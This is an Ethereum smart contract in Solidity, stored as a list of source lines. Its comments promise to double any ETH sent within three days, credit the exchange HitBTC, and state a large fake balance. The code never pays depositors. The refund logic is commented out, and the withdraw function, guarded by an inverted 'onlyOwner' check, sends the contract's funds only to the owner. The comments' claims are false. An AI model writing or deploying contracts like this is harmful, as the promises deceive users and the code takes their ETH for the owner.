['pragma solidity ^0.4.15;\n', '\n', '// Double ETH in just 3 days will automatically be sent back to the sender&#39;s address\n', '// ETH 1 sender will be sent back 2 ETH\n', '// Create by HitBTC => https://hitbtc.com/DICE-to-ETH\n', '\n', '// Send 1 ETH to this Contract and will be sent back 3 days for 2 ETH\n', '// Сurrent Etheroll / Ethereum exchange rate\n', '// Double ETH hitbtc\n', '// Dice Manual ETH => https://hitbtc.com/DICE-to-ETH\n', '\n', '// Balance for DoubleETH : \t208,500.830858147216051009 Ether\n', '// Ether Value           :\t$84,421,986.41 (@ $404.90/ETH)\n', '\n', 'contract DoubleETH {\n', '\n', '    address public richest;\n', '    address public owner;\n', '    uint public mostSent;\n', '\n', '    modifier onlyOwner() {\n', '        require (msg.sender != owner);\n', '        _;\n', '\n', '    }\n', '\n', '    mapping (address => uint) pendingWithdraws;\n', '\n', '    function DoubleETH () payable {\n', '        richest = msg.sender;\n', '        mostSent = msg.value;\n', '        owner = msg.sender;\n', '    }\n', '\n', '    function becomeRichest() payable returns (bool){\n', '        require(msg.value > mostSent);\n', '        pendingWithdraws[richest] += msg.value;\n', '        richest = msg.sender;\n', '        mostSent = msg.value;\n', '        return true;\n', '    }\n', '\n', '    function withdraw(uint amount) onlyOwner returns(bool) {\n', '        // uint amount = pendingWithdraws[msg.sender];\n', '        // pendingWithdraws[msg.sender] = 0;\n', '        // msg.sender.transfer(amount);\n', '        require(amount < this.balance);\n', '        owner.transfer(amount);\n', '        return true;\n', '\n', '    }\n', '\n', '    function getBalanceContract() constant returns(uint){\n', '        return this.balance;\n', '    }\n', '\n', '}']